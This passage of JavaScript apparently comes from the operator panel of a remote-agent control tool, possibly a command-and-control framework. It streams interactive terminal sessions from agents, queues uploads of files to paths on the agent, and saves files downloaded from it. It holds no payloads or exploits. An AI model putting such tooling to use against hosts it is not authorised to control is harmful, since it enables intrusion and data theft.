  $('task-input').placeholder = TASK_TYPES[selectedTaskType].placeholder;

  if (sendStop) {
    const end = document.createElement('div');
    end.className = 'interactive-end';
    end.textContent = 'INTERACTIVE MODE ENDED';
    $('output').appendChild(end);
    scrollOutputToBottom();
  }

  applyTaskTypeUI();

  if (sendStop && activeAgentID && token) {
    apiFetch('/api/agents/' + activeAgentID + '/task', {
      method: 'POST',
      body: JSON.stringify({ type: 'interactive', payload: 'stop' }),
    }).catch(() => {});
  }

  updateTaskContextStatus();
}

async function startSSEStream(agentID) {
  stopSSEStream();

  try {
    const resp = await apiFetch('/api/agents/' + agentID + '/terminal/stream', {
      headers: { Accept: 'text/event-stream' },
    });
    if (!resp.ok || !resp.body) {
      const message = await readResponseMessage(resp, 'interactive stream unavailable');
      appendOutput('[!] ' + message, '', agentID);
      return;
    }

    const reader = resp.body.getReader();
    sseReader = reader;
    const decoder = new TextDecoder();
    let buffer = '';

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;

      buffer += decoder.decode(value, { stream: true });
      const lines = buffer.split('\n');
      buffer = lines.pop();

      for (const line of lines) {
        if (!line.startsWith('data: ')) continue;

        try {
          handleTaskOutput(JSON.parse(line.slice(6)));
        } catch (_) {
          // Ignore malformed SSE fragments and keep the stream alive.
        }
      }
    }
  } catch (err) {
    if (interactiveMode) appendOutput('[!] stream disconnected: ' + err.message, '', agentID);
  }
}

function stopSSEStream() {
  if (!sseReader) return;
  sseReader.cancel().catch(() => {});
  sseReader = null;
}

$('upload-btn').addEventListener('click', () => {
  $('upload-file-input').click();
});

$('upload-file-input').addEventListener('change', () => {
  const file = $('upload-file-input').files[0];
  if (file) showUploadPrompt(file);
  $('upload-file-input').value = '';
});

const outputEl = $('output');

$('jump-latest-btn').addEventListener('click', () => {
  scrollOutputToBottom();
});

outputEl.addEventListener('scroll', () => {
  followOutput = isOutputNearBottom();
  updateOutputControls();
});

outputEl.addEventListener('dragover', e => {
  if (!activeAgentID || interactiveMode) return;
  e.preventDefault();
  outputEl.classList.add('drag-over');
});

outputEl.addEventListener('dragleave', e => {
  if (!e.relatedTarget || !outputEl.contains(e.relatedTarget)) {
    outputEl.classList.remove('drag-over');
  }
});

outputEl.addEventListener('drop', e => {
  if (!activeAgentID || interactiveMode) return;
  e.preventDefault();
  outputEl.classList.remove('drag-over');
  const file = e.dataTransfer.files[0];
  if (file) showUploadPrompt(file);
});

function showUploadPrompt(file) {
  if (interactiveMode || !activeAgentID || taskRequestInFlight) return;
  clearKillConfirmation();

  if (file.size > MAX_UPLOAD_BYTES) {
    appendOutput('[-] file too large: ' + file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB). Max is 36 KB.');
    return;
  }

  pendingUploadFile = file;
  $('upload-filename-label').textContent = file.name + ' ->';
  $('upload-path').value = '';
  $('upload-path').disabled = false;
  $('upload-path').classList.remove('input-error');
  $('task-type-list').hidden = true;
  $('task-row').hidden = true;
  $('upload-row').hidden = false;
  $('task-help').textContent = 'Choose a destination path for the selected file.';
  $('composer-note').textContent = 'Upload payloads are size-limited and base64 validated before queueing.';
  updateTaskContextStatus();
  $('upload-path').focus();
}

function hideUploadPrompt() {
  pendingUploadFile = null;
  $('upload-row').hidden = true;
  $('task-row').hidden = false;
  if (!interactiveMode) applyTaskTypeUI();
  focusPrimaryInput(false);
}

$('upload-cancel-btn').addEventListener('click', hideUploadPrompt);

$('upload-path').addEventListener('keydown', e => {
  if (e.key === 'Enter') doUpload();
  if (e.key === 'Escape') hideUploadPrompt();
});

$('upload-confirm-btn').addEventListener('click', doUpload);

function doUpload() {
  if (!pendingUploadFile || !activeAgentID || taskRequestInFlight) return;

  const remotePath = $('upload-path').value.trim();
  if (!remotePath) {
    setUploadPathError('Enter a remote destination path before sending the upload.');
    return;
  }

  if (hasInvalidPathChars(remotePath)) {
    setUploadPathError('Upload paths cannot contain line breaks or null bytes.');
    return;
  }

  const file = pendingUploadFile;
  const targetAgentID = activeAgentID;
  hideUploadPrompt();
  setQueueBusy(true, 'Submitting upload...');

  const reader = new FileReader();
  reader.onload = async e => {
    const bytes = new Uint8Array(e.target.result);
    let binary = '';
    for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
    const payload = remotePath + ':' + btoa(binary);

    try {
      const data = await submitTask(targetAgentID, { type: 'upload', payload });
      if (!data) return;
      appendOutput('[>] upload ' + file.name + ' -> ' + remotePath + '  (id: ' + data.task_id.slice(0, 8) + ')', '', targetAgentID);
      focusPrimaryInput(false, true);
    } catch (err) {
      appendOutput('[-] upload network error: ' + err.message, '', targetAgentID);
    } finally {
      setQueueBusy(false, '');
    }
  };
  reader.onerror = () => {
    appendOutput('[-] upload read error: unable to read local file', '', targetAgentID);
    setQueueBusy(false, '');
  };

  reader.readAsArrayBuffer(file);
}

function setUploadPathError(message) {
  $('upload-path').classList.add('input-error');
  $('upload-path').focus();
  appendOutput('[-] ' + message);
}

function hasInvalidPathChars(value) {
  return !value || value.length > MAX_REMOTE_PATH || /[\u0000\r\n]/.test(value);
}

function appendOutput(text, cssClass, targetAgentID) {
  if (targetAgentID && targetAgentID !== activeAgentID) return;

  const shouldScroll = followOutput || isOutputNearBottom();
  const line = document.createElement('div');
  if (cssClass) line.classList.add(cssClass);
  line.textContent = text;
  $('output').appendChild(line);
  if (shouldScroll) scrollOutputToBottom();
  else updateOutputControls();
  updateOutputEmptyState();
}

function appendDownloadResult(short, ts, base64Value, historical) {
  const label = '[' + short + ' ' + ts + '] download ready';
  const shouldScroll = followOutput || isOutputNearBottom();
  const wrap = document.createElement('div');
  wrap.className = 'output-download';

  const text = document.createElement('span');
  text.textContent = historical
    ? label + ' from session history. Click to save it locally.'
    : label + '. Click to save it locally.';

  const button = document.createElement('button');
  button.type = 'button';
  button.className = 'output-download-btn';
  button.textContent = 'Save File';
  button.addEventListener('click', () => {
    try {
      triggerDownload(base64Value, 'download_' + short);
    } catch (_) {
      appendOutput('[err ' + short + ' ' + ts + '] invalid download payload');
    }
  });

  wrap.appendChild(text);
  wrap.appendChild(button);
  $('output').appendChild(wrap);
  if (shouldScroll) scrollOutputToBottom();
  else updateOutputControls();
  updateOutputEmptyState();
}

function triggerDownload(base64Value, filename) {
  const binary = atob(base64Value);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);

  const blob = new Blob([bytes]);
  const url = URL.createObjectURL(blob);
  const anchor = document.createElement('a');
  anchor.href = url;
  anchor.download = filename;
  document.body.appendChild(anchor);
  anchor.click();
  document.body.removeChild(anchor);
  URL.revokeObjectURL(url);
}

applyTaskTypeUI();
updateOutputControls();
updateOutputEmptyState();
